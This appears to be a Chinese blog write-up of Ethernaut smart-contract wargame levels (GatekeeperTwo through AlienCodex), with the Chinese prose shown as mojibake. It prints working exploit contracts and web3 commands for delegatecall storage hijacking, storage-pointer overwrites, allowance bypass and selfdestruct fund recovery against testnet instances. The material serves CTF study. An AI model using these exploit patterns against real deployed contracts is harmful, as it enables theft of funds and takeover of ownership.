GatekeeperTwo &#123; address public entrant; modifier gateOne() &#123; require(msg.sender != tx.origin); _; &#125; modifier gateTwo() &#123; uint x; assembly &#123; x := extcodesize(caller) &#125; require(x == 0); _; &#125; modifier gateThree(bytes8 _gateKey) &#123; require(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(0) - 1); _; &#125; function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123; entrant = tx.origin; return true; &#125;&#125;contract hack &#123; function hack(address _c) &#123; GatekeeperTwo c = GatekeeperTwo(_c); bytes8 _gateKey = bytes8(uint64(keccak256(address(this))) ^ (uint64(0) - 1)); c.enter(_gateKey); &#125;&#125; Áõ¥Êé•ÈÉ®ÁΩ≤ÂêàÁ∫¶ hack Âç≥ÂèØ Naught CoinRequire Complete this level by getting your token balance to 0. Source1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.18;import 'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'; contract NaughtCoin is StandardToken &#123; using SafeMath for uint256; string public constant name = 'NaughtCoin'; string public constant symbol = '0x0'; uint public constant decimals = 18; uint public timeLock = now + 10 years; uint public INITIAL_SUPPLY = (10 ** decimals).mul(1000000); address public player; function NaughtCoin(address _player) public &#123; player = _player; totalSupply_ = INITIAL_SUPPLY; balances[player] = INITIAL_SUPPLY; Transfer(0x0, player, INITIAL_SUPPLY); &#125; function transfer(address _to, uint256 _value) lockTokens public returns(bool) &#123; super.transfer(_to, _value); &#125; // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens() &#123; if (msg.sender == player) &#123; require(now &gt; timeLock); _; &#125; else &#123; _; &#125; &#125; &#125; Analyse Ê†πÊçÆÈ¢òÊÑèÔºåÈúÄË¶ÅÂ∞ÜËá™Â∑±ÁöÑ balance Ê∏ÖÁ©∫„ÄÇÂêàÁ∫¶Êèê‰æõ‰∫Ü transfer() ËøõË°åËΩ¨Ë¥¶Ôºå‰ΩÜÊúâ‰∏Ä‰∏™ modifier lockTokens() ÈôêÂà∂ÔºåÂè™Êúâ 10 Âπ¥ÂêéÊâçËÉΩË∞ÉÁî® transfer() Ê≥®ÊÑèËØ•ÂêàÁ∫¶ÊòØ StandardToken ÁöÑÂ≠êÂêàÁ∫¶ÔºåÈ¢òÁõÆ‰∏≠‰πüÁªô‰∫Ü The ERC20 Spec Âíå The OpenZeppelin codebase Âú®Â≠êÂêàÁ∫¶Êâæ‰∏çÂá∫Êõ¥Â§ö‰ø°ÊÅØÁöÑÊó∂ÂÄôÔºåÊääÁõÆÂÖâÊõ¥Â§öÊîæÂà∞Áà∂ÂêàÁ∫¶ StandardToken.sol ÂíåÊé•Âè£‰∏ä Âú® The ERC20 Spec ‰∏≠ÔºåÈô§‰∫Ü transfer() ‰πãÂ§ñÔºåËøòÊúâ transferFrom() ÂáΩÊï∞‰πüÂèØ‰ª•ËøõË°åËΩ¨Ë¥¶ Áõ¥Êé•ÁúãÁà∂ÂêàÁ∫¶ StandardToken.sol 12345678910111213contract StandardToken &#123; using ERC20Lib for ERC20Lib.TokenStorage; ERC20Lib.TokenStorage token; ... function transfer(address to, uint value) returns (bool ok) &#123; return token.transfer(to, value); &#125; function transferFrom(address from, address to, uint value) returns (bool ok) &#123; return token.transferFrom(from, to, value); &#125; ...&#125; Ë∑üËøõ ERC20Lib.sol 1234567891011121314151617181920212223242526library ERC20Lib &#123; ... function transfer(TokenStorage storage self, address _to, uint _value) returns (bool success) &#123; self.balances[msg.sender] = self.balances[msg.sender].minus(_value); self.balances[_to] = self.balances[_to].plus(_value); Transfer(msg.sender, _to, _value); return true; &#125; function transferFrom(TokenStorage storage self, address _from, address _to, uint _value) returns (bool success) &#123; var _allowance = self.allowed[_from](msg.sender); self.balances[_to] = self.balances[_to].plus(_value); self.balances[_from] = self.balances[_from].minus(_value); self.allowed[_from](msg.sender) = _allowance.minus(_value); Transfer(_from, _to, _value); return true; &#125; ... function approve(TokenStorage storage self, address _spender, uint _value) returns (bool success) &#123; self.allowed[msg.sender](_spender) = _value; Approval(msg.sender, _spender, _value); return true; &#125;&#125; ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî®Ëøô‰∏™ transferFrom Ôºå‰ΩÜÊòØ transferFrom ÈúÄË¶Å msg.sender Ëé∑ÂæóÊéàÊùÉÔºåÁî±‰∫éÊàë‰ª¨Â∞±ÊòØÂêàÁ∫¶ÁöÑ owner ÔºåÊâÄ‰ª•ÂèØ‰ª•Ëá™Â∑±Ë∞ÉÁî® approve ÁªôËá™Â∑±ÊéàÊùÉ Solution12await contract.approve(player, (await contract.INITIAL_SUPPLY()).toNumber())await contract.transferFrom(player, instance, (await contract.INITIAL_SUPPLY()).toNumber()) PreservationRequire This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored. The goal of this level is for you to claim ownership of the instance you are given. Source123456789101112131415161718192021222324252627282930313233343536373839pragma solidity ^0.4.23;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(setTimeSignature, _timeStamp); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(setTimeSignature, _timeStamp); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125; Analyse delegatecall ÂÆö‰πâÔºö.delegatecall(‚Ä¶) returns (bool): issue low-level DELEGATECALL, returns false on failure, forwards all available gas, adjustable delegatecall ‰∏é call ÂäüËÉΩÁ±ª‰ººÔºåÂå∫Âà´Âú®‰∫é delegatecall ‰ªÖ‰ΩøÁî®ÁªôÂÆöÂú∞ÂùÄÁöÑ‰ª£Á†ÅÔºåÂÖ∂ÂÆÉ‰ø°ÊÅØÂàô‰ΩøÁî®ÂΩìÂâçÂêàÁ∫¶(Â¶ÇÂ≠òÂÇ®Ôºå‰ΩôÈ¢ùÁ≠âÁ≠â)„ÄÇÊ≥®ÊÑè delegatecall ÊòØÂç±Èô©ÂáΩÊï∞ÔºåÂÆÉÂèØ‰ª•ÂÆåÂÖ®Êìç‰ΩúÂΩìÂâçÂêàÁ∫¶ÁöÑÁä∂ÊÄÅÔºåÂèØ‰ª•ÂèÇËÄÉÁ¨¨7È¢ò Delegation delegateCall ÊñπÊ≥ï‰ªÖ‰ªÖ‰ΩøÁî®ÁõÆÊ†áÂêàÁ∫¶ÁöÑ‰ª£Á†ÅÔºå ÂÖ∂‰ΩôÁöÑ storage Á≠âÊï∞ÊçÆÂùá‰ΩøÁî®Ëá™Â∑±ÁöÑÔºåËøôÂ∞±‰ΩøÂæóÊüê‰∫õËÆøÂ≠òÊìç‰Ωú‰ºöÈîôËØØÁöÑÂ§ÑÁêÜÂØπË±° ÊâÄ‰ª•Ëøô‰∏™È¢òÂèØ‰ª•ËøôÊ†∑Ëß£ÂÜ≥Ôºö Êàë‰ª¨Ë∞ÉÁî® Preservation ÁöÑ setFirstTime ÂáΩÊï∞ÂÆûÈôÖÈÄöËøá delegatecall ÊâßË°å‰∫Ü LibraryContract ÁöÑ setTime ÂáΩÊï∞Ôºå‰øÆÊîπ‰∫Ü slot 1 Ôºå‰πüÂ∞±ÊòØ‰øÆÊîπ‰∫Ü timeZone1Library ÂèòÈáè ËøôÊ†∑ÔºåÊàë‰ª¨Á¨¨‰∏ÄÊ¨°Ë∞ÉÁî® setFirstTime Â∞Ü timeZone1Library ÂèòÈáè‰øÆÊîπ‰∏∫Êàë‰ª¨ÁöÑÊÅ∂ÊÑèÂêàÁ∫¶ÁöÑÂú∞ÂùÄÔºåÁ¨¨‰∫åÊ¨°Ë∞ÉÁî® setFirstTime Â∞±ÂèØ‰ª•ÊâßË°åÊàë‰ª¨ÁöÑ‰ªªÊÑè‰ª£Á†Å‰∫Ü Solution1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859pragma solidity ^0.4.23;contract Preservation &#123; // public library contracts address public timeZone1Library; address public timeZone2Library; address public owner; uint storedTime; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)")); constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123; timeZone1Library = _timeZone1LibraryAddress; timeZone2Library = _timeZone2LibraryAddress; owner = msg.sender; &#125; // set the time for timezone 1 function setFirstTime(uint _timeStamp) public &#123; timeZone1Library.delegatecall(setTimeSignature, _timeStamp); &#125; // set the time for timezone 2 function setSecondTime(uint _timeStamp) public &#123; timeZone2Library.delegatecall(setTimeSignature, _timeStamp); &#125;&#125;// Simple library contract to set the timecontract LibraryContract &#123; // stores a timestamp uint storedTime; function setTime(uint _time) public &#123; storedTime = _time; &#125;&#125;contract attack &#123; address public timeZone1Library; address public timeZone2Library; address public owner; address instance_address = 0x7cec052e622c0fb68ca3b2e3c899b8bf8b78663c; Preservation target = Preservation(instance_address); function attack1() &#123; target.setFirstTime(uint(address(this))); &#125; function attack2() &#123; target.setFirstTime(uint(0x88d3052d12527f1fbe3a6e1444ea72c4ddb396c2)); &#125; function setTime(uint _time) public &#123; timeZone1Library = address(_time); timeZone2Library = address(_time); owner = address(_time); &#125;&#125; ÂÖàË∞ÉÁî® attack1() ÔºåÂÜçË∞ÉÁî® attack2() Âç≥ÂèØ LockedRequire This name registrar is locked and will not accept any new names to be registered. Unlock this registrar to beat the level. Source123456789101112131415161718192021222324252627pragma solidity ^0.4.23; // A Locked Name Registrarcontract Locked &#123; bool public unlocked = false; // registrar locked, no name updates struct NameRecord &#123; // map hashes to addresses bytes32 name; // address mappedAddress; &#125; mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses function register(bytes32 _name, address _mappedAddress) public &#123; // set up the new NameRecord NameRecord newRecord; newRecord.name = _name; newRecord.mappedAddress = _mappedAddress; resolve[_name] = _mappedAddress; registeredNameRecord[msg.sender] = newRecord; require(unlocked); // only allow registrations if contract is unlocked &#125;&#125; Analyse ÂÖ∏ÂûãÁöÑÂà©Áî® struct ÈªòËÆ§ÊòØ storage ÁöÑÈ¢òÁõÆ ÂáΩÊï∞‰∏≠Â£∞ÊòéÁöÑ newRecord ÁªìÊûÑ‰Ωì‰øÆÊîπ name Âíå mappedAddress ÂÆûÈôÖÂàÜÂà´ÊîπÁöÑÊòØ unlocked Âíå bytes32 name ÊâÄ‰ª•Êää name ÂØπÂ∫îÁöÑ slot 0 ÁöÑÂÄºÊîπÊàê 1 Â∞±Ë°å‰∫Ü Solution1234567891011121314151617181920212223242526272829303132333435pragma solidity ^0.4.23; // A Locked Name Registrarcontract Locked &#123; bool public unlocked = false; // registrar locked, no name updates struct NameRecord &#123; // map hashes to addresses bytes32 name; // address mappedAddress; &#125; mapping(address =&gt; NameRecord) public registeredNameRecord; // records who registered names mapping(bytes32 =&gt; address) public resolve; // resolves hashes to addresses function register(bytes32 _name, address _mappedAddress) public &#123; // set up the new NameRecord NameRecord newRecord; newRecord.name = _name; newRecord.mappedAddress = _mappedAddress; resolve[_name] = _mappedAddress; registeredNameRecord[msg.sender] = newRecord; require(unlocked); // only allow registrations if contract is unlocked &#125;&#125;contract hack &#123; address instance_addr = 0xfce5ca4942678982889e6c9934a2afb02c670098; Locked target = Locked(instance_addr); function exploit() &#123; target.register(1, tx.origin); &#125;&#125; Ë∞ÉÁî® exploit() Âç≥ÂèØ RecoveryRequire A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address ÂÖ∂ÂÆûÁÆÄÂçïÊù•ËØ¥Â∞±ÊòØÂ∑≤Áü•‰∏Ä‰∏™ Recovery ÂêàÁ∫¶Âú∞ÂùÄÔºåÊÅ¢Â§ç‰∏Ä‰∏ãÂÆÉÂàõÂª∫ÁöÑ SimpleToken Âú∞ÂùÄÔºåÁÑ∂ÂêéÂ∞Ü 0.5 eth ‰ªé‰∏¢Â§±Âú∞ÂùÄÁöÑÂêàÁ∫¶‰∏≠ÊèêÂá∫Âç≥ÂèØ Source12345678910111213141516171819202122232425262728293031323334353637383940414243pragma solidity ^0.4.23;import 'openzeppelin-solidity/contracts/math/SafeMath.sol';contract Recovery &#123; //generate tokens function generateToken(string _name, uint256 _initialSupply) public &#123; new SimpleToken(_name, msg.sender, _initialSupply); &#125;&#125;contract SimpleToken &#123; using SafeMath for uint256; // public variables string public name; mapping (address =&gt; uint) public balances; // constructor constructor(string _name, address _creator, uint256 _initialSupply) public &#123; name = _name; balances[_creator] = _initialSupply; &#125; // collect ether in return for tokens function() public payable &#123; balances[msg.sender] = msg.value.mul(10); &#125; // allow transfers of tokens function transfer(address _to, uint _amount) public &#123; require(balances[msg.sender] &gt;= _amount); balances[msg.sender] = balances[msg.sender].sub(_amount); balances[_to] = _amount; &#125; // clean up after ourselves function destroy(address _to) public &#123; selfdestruct(_to); &#125;&#125; Analyse Âå∫ÂùóÈìæ‰∏äÊâÄÊúâ‰ø°ÊÅØÈÉΩÊòØÂÖ¨ÂºÄÁöÑÔºåÁõ¥Êé•‰∏ä ropsten ÊµãËØïÁΩëÁöÑÂÆòÊñπÁΩëÈ°µÊü•Â∞±ÂèØ‰ª•‰∫Ü SolutionÊñπÊ≥ï‰∏Ä ‰ªé console ÊâæÂà∞ÂÆû‰æãÂú∞ÂùÄÔºö0xd29fcc4b193a576a17af9194d706b17ce5da24e2 ÈÄöËøá ropsten.etherscan.io ÊâæÂà∞Ëøô‰∏™ÂÆû‰æãÁöÑ‰∫§Êòì‰ø°ÊÅØÔºöhttps://ropsten.etherscan.io/address/0xd29fcc4b193a576a17af9194d706b17ce5da24e2#internaltx ÂÜçÈÄöËøá‰∫§Êòì‰ø°ÊÅØÊâæÂà∞Áîü‰∫ßÂêàÁ∫¶ lost contract ÁöÑÂú∞ÂùÄ: 0x77a70a61a077e3aee72404e0e70211bfa72e962b Âú® remix ÈÉ®ÁΩ≤ SimpleToken Ôºå‰ΩøÁî® At address ÊåáÂÆö lost contract ÁöÑÂú∞ÂùÄÔºåÁÑ∂ÂêéÊâßË°å destroy(play_address) Âç≥ÂèØ Êü•ÁúãÂêàÁ∫¶Âú∞ÂùÄÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèË¢´ÈîÄÊØÅhttps://ropsten.etherscan.io/address/0x77a70a61a077e3aee72404e0e70211bfa72e962b#internaltx ‰∏Ä‰∫õÂàÜÊûê ÊñπÊ≥ï‰∏ÄÊèê‰∫§‰πãÂêéÔºåZeppelin ÁªôÂá∫‰∫ÜÂéüÁêÜÂ¶Ç‰∏ãÔºö Contract addresses are deterministic and are calculated by keccack256(address, nonce) where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).Because of this, one can send ether to a pre-determined address (which has no private key) and later create a contract at that address which recovers the ether. This is a non-intuitive and somewhat secretive way to (dangerously) store ether without holding a private key.An interesting blog post by Martin Swende details potential use cases of this.If you‚Äôre going to implement this technique, make sure you don‚Äôt miss the nonce, or your funds will be lost forever. ÂéüÊù•È¢òÁõÆÁöÑËÄÉÁÇπÊòØÂêàÁ∫¶Âú∞ÂùÄÂèØËÆ°ÁÆóÔºåÊâÄ‰ª•ËøôÈ¢òÊúâ‰∏§ÁßçËß£Ê≥ï ÊñπÊ≥ï‰∫å ÂèÇËÄÉ https://www.freebuf.com/articles/blockchain-articles/179662.html ÂèÇËÄÉ https://github.com/ethereum/wiki/wiki/RLP 12345678910111213141516171819202122232425def rlp_encode(input): if isinstance(input,str): if len(input) == 1 and ord(input) &lt; 0x80: return input else: return encode_length(len(input), 0x80) + input elif isinstance(input,list): output = '' for item in input: output += rlp_encode(item) return encode_length(len(output), 0xc0) + outputdef encode_length(L,offset): if L &lt; 56: return chr(L + offset) elif L &lt; 256**8: BL = to_binary(L) return chr(len(BL) + offset + 55) + BL else: raise Exception("input too long")def to_binary(x): if x == 0: return '' else: return to_binary(int(x / 256)) + chr(x % 256)print rlp_encode(["d29fcc4b193a576a17af9194d706b17ce5da24e2".decode('hex'),"01".decode('hex')]).encode('hex') ÁªìÊûúÊòØ d694d29fcc4b193a576a17af9194d706b17ce5da24e201 ÊãøÂà∞ solidity ËÆ°ÁÆóÂú∞ÂùÄ 123456pragma solidity ^0.4.18;contract test&#123; function func() view returns (address)&#123; return address(keccak256(0xd694d29fcc4b193a576a17af9194d706b17ce5da24e201)); &#125;&#125; ÂèØ‰ª•ÁúãÂà∞ËÆ°ÁÆóÁöÑÂú∞ÂùÄÂíåÊñπÊ≥ï‰∏ÄÊòØ‰∏ÄÊ†∑ÁöÑ MagicNumberRequireTo solve this level, you only need to provide the Ethernaut with a ‚ÄúSolver‚Äù, a contract that responds to ‚ÄúwhatIsTheMeaningOfLife()‚Äù with the right number.Easy right? Well‚Ä¶ there‚Äôs a catch.The solver‚Äôs code needs to be really tiny. Really reaaaaaallly tiny. Like freakin‚Äô really really itty-bitty tiny: 10 opcodes at most.Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That‚Äôs right: Raw EVM bytecode.Good luck! È¢òÁõÆÁöÑÊÑèÊÄùÂ∞±ÊòØÈÉ®ÁΩ≤‰∏Ä‰∏™ÂêàÁ∫¶ Solver ÔºåË¶ÅÊ±ÇÂú®Ë¢´Ë∞ÉÁî® whatIsTheMeaningOfLife() ÂáΩÊï∞Êó∂ËøîÂõû 42 Â∞±ÂèØ‰ª•‰∫ÜÔºå‰ΩÜÊúâ‰∏Ä‰∏™ÈôêÂà∂ÊòØ‰∏çËÉΩË∂ÖËøá 10 ‰∏™ opcode Source123456789101112131415161718192021222324pragma solidity ^0.4.24;contract MagicNum &#123; address public solver; constructor() public &#123;&#125; function setSolver(address _solver) public &#123; solver = _solver; &#125; /* ____________/\\\_______/\\\\\\\\\_____ __________/\\\\\_____/\\\///////\\\___ ________/\\\/\\\____\///______\//\\\__ ______/\\\/\/\\\______________/\\\/___ ____/\\\/__\/\\\___________/\\\//_____ __/\\\\\\\\\\\\\\\\_____/\\\//________ _\///////////\\\//____/\\\/___________ ___________\/\\\_____/\\\\\\\\\\\\\\\_ ___________\///_____\///////////////__ */&#125; AnalyseÂ§öËØ¥ÁöÑËØù ÂèÇËÄÉ https://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 ÂèÇËÄÉ https://f3real.github.io/Ethernaut_wargame19.html ÂõæÁâáÊù•Ëá™‰∫éhttps://medium.com/coinmonks/ethernaut-lvl-19-magicnumber-walkthrough-how-to-deploy-contracts-using-raw-assembly-opcodes-c50edb0f71a2 ÂÖàÁúã‰∏Ä‰∏ã contract creation ÊúüÈó¥‰ºöÂèëÁîü‰ªÄ‰πàÔºö1„ÄÅÈ¶ñÂÖàÔºåÁî®Êà∑ÊàñÂêàÁ∫¶Â∞Ü‰∫§ÊòìÂèëÈÄÅÂà∞‰ª•Â§™ÁΩëÁΩëÁªú„ÄÇÊ≠§‰∫§ÊòìÂåÖÂê´Êï∞ÊçÆÔºå‰ΩÜÊ≤°Êúâ to Âú∞ÂùÄÔºåË°®ÊòéËøôÊòØ‰∏Ä‰∏™ÂêàÁ∫¶ÂàõÂª∫ÔºåËÄå‰∏çÊòØ‰∏Ä‰∏™ send/call transaction2„ÄÅÂÖ∂Ê¨°ÔºåEVM Â∞Ü SolidityÔºàÈ´òÁ∫ßËØ≠Ë®ÄÔºâÁöÑÂêàÁ∫¶‰ª£Á†ÅÁºñËØë‰∏∫ bytecodeÔºàÂ∫ïÂ±ÇÁöÑÊú∫Âô®ËØ≠Ë®ÄÔºâÔºåËØ• bytecode Áõ¥Êé•ËΩ¨Êç¢‰∏∫ opcodes ÔºåÂú®Âçï‰∏™Ë∞ÉÁî®Â†ÜÊ†à‰∏≠ËøêË°å ÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºöcontract creation ÁöÑ bytecode ÂåÖÂê´‰∏§ÈÉ®ÂàÜÔºöinitialization code Âíå runtime code 3„ÄÅÂú® contract creation ÊúüÈó¥ÔºåEVM ‰ªÖÊâßË°å initialization code Áõ¥Âà∞Âà∞ËææÂ†ÜÊ†à‰∏≠ÁöÑÁ¨¨‰∏ÄÊù° STOP Êàñ RETURN Êåá‰ª§ÔºåÂú®Ê≠§Èò∂ÊÆµÔºåÂêàÁ∫¶ÁöÑ constructor() ‰ºöË¢´ËøêË°åÔºåÂêàÁ∫¶‰æøÊúâÂú∞ÂùÄ‰∫Ü Âú®ËøêË°å initialization code ÂêéÔºåÂè™Êúâ runtime code Âú®Â†ÜÊ†à‰∏äÔºåÁÑ∂ÂêéÂ∞ÜËøô‰∫õ opcode Êã∑Ë¥ù Âà∞ memory Âπ∂ËøîÂõûÂà∞ EVM 4„ÄÅÊúÄÂêéÔºåEVM Â∞Ü runtime code ËøîÂõûÁöÑ opcode Â≠òÂÇ®Âú® state storage ÔºåÂπ∂‰∏éÊñ∞ÁöÑÂêàÁ∫¶Âú∞ÂùÄÁõ∏ÂÖ≥ËÅîÔºåÂú®Â∞ÜÊù•ÂØπÊñ∞ÂêàÁ∫¶ÁöÑË∞ÉÁî®Êó∂ÔºåËøô‰∫õ runtime code Â∞ÜË¢´ÊâßË°å ÂØπ‰∫éËØ•È¢ò ÊâÄ‰ª•‰∏∫‰∫ÜËß£ÂÜ≥ËØ•È¢òÔºåÊàë‰ª¨ÈúÄË¶Å initialization opcodes Âíå runtime codes initialization opcodes: Áî± EVM ËøêË°åÂàõÂª∫ÂêàÁ∫¶Âπ∂Â≠òÂÇ®Â∞ÜÊù•Ë¶ÅÁî®ÁöÑ runtime codes runtime codes: ÂåÖÂê´ÊâÄÈúÄÁöÑÂÆûÈôÖÊâßË°åÈÄªËæë„ÄÇÂØπ‰∫éÊú¨È¢òÊù•ËØ¥ÔºåËøôÊòØÂ∫îËØ•ËøîÂõûÁöÑ‰ª£Á†ÅÁöÑ‰∏ªË¶ÅÈÉ®ÂàÜÔºåÂ∫îËØ• return 42 Âπ∂‰∏î under 10 opcodes 1„ÄÅÂÖàÊù•Áúã runtime codes : ËøîÂõûÂÄºÁî± return(p, s) Êìç‰ΩúÁ†ÅÂ§ÑÁêÜÔºå‰ΩÜÊòØÂú®ËøîÂõûÂÄº‰πãÂâçÔºåÂøÖÈ°ªÂÖàÂ≠òÂÇ®Âú®ÂÜÖÂ≠ò‰∏≠Ôºå‰ΩøÁî® mstore(p, v) Â∞Ü 42 Â≠òÂÇ®Âú®ÂÜÖÂ≠ò‰∏≠ È¶ñÂÖàÔºå‰ΩøÁî® mstore(p, v) Â∞Ü 42 Â≠òÂÇ®Âú®ÂÜÖÂ≠ò‰∏≠ÔºåÂÖ∂‰∏≠ p ÊòØÂú®ÂÜÖÂ≠ò‰∏≠ÁöÑÂ≠òÂÇ®‰ΩçÁΩÆÔºå v ÊòØÂçÅÂÖ≠ËøõÂà∂ÂÄºÔºå42 ÁöÑÂçÅÂÖ≠ËøõÂà∂ÊòØ 0x2a 1230x602a ;PUSH1 0x2a v0x6080 ;PUSH1 0x80 p0x52 ;MSTORE ÁÑ∂ÂêéÔºå‰ΩøÁî® return(p, s) ËøîÂõû 0x2a ÔºåÂÖ∂‰∏≠ p ÊòØÂÄº 0x2a Â≠òÂÇ®ÁöÑ‰ΩçÁΩÆÔºås ÊòØÂÄº 0x2a Â≠òÂÇ®ÊâÄÂç†ÁöÑÂ§ßÂ∞è 0x20 ÔºåÂç†32Â≠óËäÇ 1230x6020 ;PUSH1 0x20 s0x6080 ;PUSH1 0x80 p0xf3 ;RETURN ÊâÄ‰ª• runtime codes Â∫îËØ•ÊòØ 602a60805260206080f3 ÔºåÊ≠£Â•Ω 10 opcodes 2„ÄÅÂÜçÊù•Áúã initialization codes : È¶ñÂÖàÔºåinitialization codes ÈúÄË¶ÅÂÖàÂ∞Ü runtime codes Êã∑Ë¥ùÂà∞ÂÜÖÂ≠òÔºåÁÑ∂ÂêéÂÜçÂ∞ÜÂÖ∂ËøîÂõûÂà∞ EVM „ÄÇÂ∞Ü‰ª£Á†Å‰ªé‰∏Ä‰∏™Âú∞ÊñπÂ§çÂà∂Âà∞Âè¶‰∏Ä‰∏™Âú∞ÊñπÊòØ codecopy(t, f, s) Êìç‰ΩúÁ†Å„ÄÇt ÊòØ‰ª£Á†ÅÁöÑÁõÆÊ†á‰ΩçÁΩÆÔºåf ÊòØ runtime codes ÁöÑÂΩìÂâç‰ΩçÁΩÆÔºås ÊòØ‰ª£Á†ÅÁöÑÂ§ßÂ∞èÔºå‰ª•Â≠óËäÇ‰∏∫Âçï‰ΩçÔºåÂØπ‰∫é 602a60805260206080f3 Â∞±ÊòØ 10 bytes 12345;copy bytecode to memory0x600a ;PUSH1 0x0a S(runtime code size)0x60?? ;PUSH1 0x?? F(current position of runtime opcodes)0x6000 ;PUSH1 0x00 T(destination memory index 0)0x39 ;CODECOPY ÁÑ∂ÂêéÔºåÈúÄË¶ÅÂ∞ÜÂÜÖÂ≠ò‰∏≠ÁöÑ runtime codes ËøîÂõûÂà∞ EVM 1234;return code from memory to EVM0x600a ;PUSH1 0x0a S0x6000 ;PUSH1 0x00 P0xf3 ;RETURN initialization codes ÊÄªÂÖ±Âç†‰∫Ü 0x0c Â≠óËäÇÔºåËøôË°®Á§∫ runtime codes ‰ªéÁ¥¢Âºï 0x0c ÂºÄÂßãÔºåÊâÄ‰ª• ?? ÁöÑÂú∞ÊñπÊòØ 0x0c ÊâÄ‰ª•Ôºåinitialization codes ÊúÄÂêéÁöÑÈ°∫Â∫èÊòØ 600a600c600039600a6000f3 ÊâÄ‰ª•ÔºåopcodesÊúÄÂêéÁöÑÈ°∫Â∫èÊòØ 0x600a600c600039600a6000f3602a60805260206080f3 Solution12var bytecode = "0x600a600c600039600a6000f3602a60805260206080f3";web3.eth.sendTransaction(&#123; from: player, data: bytecode &#125;, function(err,res)&#123;console.log(res)&#125;); ÂæóÂà∞https://ropsten.etherscan.io/tx/0x2e2a636712b37e27af795073a7be6fca9ddfdf964a2356d98c113463c69359ffÔºåÁÇπÂáªÊü•ÁúãÂ¶Ç‰∏ãÔºåÂæóÂà∞ Contract address ‰∏∫ 0x7baa1861df4eff11ff258e657bff2420be19b564 Ë∞ÉÁî®È¢òÁõÆÂêàÁ∫¶ setsolver(‚Äú0x7baa1861df4eff11ff258e657bff2420be19b564‚Äù) Âç≥ÂèØ Alien CodexRequire You&#39;ve uncovered an Alien contract. Claim ownership to complete the level. Source12345678910111213141516171819202122232425262728293031pragma solidity ^0.4.24;import 'zeppelin-solidity/contracts/ownership/Ownable.sol';contract AlienCodex is Ownable &#123; bool public contact; bytes32[] public codex; modifier contacted() &#123; assert(contact); _; &#125; function make_contact(bytes32[] _firstContactMessage) public &#123; assert(_firstContactMessage.length &gt; 2**200); contact = true; &#125; function record(bytes32 _content) contacted public &#123; codex.push(_content); &#125; function retract() contacted public &#123; codex.length--; &#125; function revise(uint i, bytes32 _content) contacted public &#123; codex[i] = _content; &#125;&#125; Analyse ÂêàÁ∫¶ÂºÄÂ§¥ import ‰∫Ü Ownable.sol ÂêàÁ∫¶ÔºåÂêåÊó∂‰πüÂºïÂÖ•‰∫Ü‰∏Ä‰∏™ owner ÂèòÈáè 12await web3.eth.getStorageAt(instance, 0, function(x, y) &#123;console.info(y)&#125;);// 0x00000000000000000000000073048cec9010e92c298b016966bde1cc47299df5 ÂÖ∂‰∏≠ owner = 0x73048cec9010e92c298b016966bde1cc47299df5 Ôºåcontract = 0x0ÔºåËøôÊòØÁî±‰∫é EVM Â≠òÂÇ®‰ºòÂåñÁöÑÂÖ≥Á≥ªÔºåÂèØ‰ª•ÂèÇËÄÉ https://solidity.readthedocs.io/en/v0.4.25/miscellaneous.html#layout-of-state-variables-in-storage Âπ∂‰∏îÊï∞ÁªÑ codex ÁöÑ slot ‰∏∫ 1 ÔºåÂêåÊó∂Ëøô‰πüÊòØÂ≠òÂÇ®Êï∞ÁªÑ length ÁöÑÂú∞ÊñπÔºåËÄå codex ÁöÑÂÆûÈôÖÂÜÖÂÆπÂ≠òÂÇ®Âú® keccak256(bytes32(1)) ÂºÄÂßãÁöÑ‰ΩçÁΩÆ Keccak256 ÊòØÁ¥ßÂØÜÊâìÂåÖÁöÑÔºåÊÑèÊÄùÊòØËØ¥ÂèÇÊï∞‰∏ç‰ºöË°•‰ΩçÔºåÂ§ö‰∏™ÂèÇÊï∞‰πü‰ºöÁõ¥Êé•ËøûÊé•Âú®‰∏ÄËµ∑ÔºåÊâÄ‰ª•Ë¶ÅÁî® keccak256(bytes32(1)) ÂèÇËÄÉ Solidity‰∏≠ÂêÑÁßçÂèòÈáèÁöÑÂ≠òÂÇ®ÊñπÂºè ËøôÊ†∑Êàë‰ª¨Â∞±Áü•ÈÅì‰∫Ü codex ÂÆûÈôÖÁöÑÂ≠òÂÇ®ÁöÑ slot ÔºåÂèØ‰ª•Â∞ÜÂä®ÊÄÅÊï∞ÁªÑÂÜÖÂèòÈáèÁöÑÂ≠òÂÇ®‰ΩçËÆ°ÁÆóÊñπÊ≥ïÊ¶ÇÊã¨‰∏∫: array[array_slot_index] == SLOAD(keccak256(slot(array)) + slot_index). 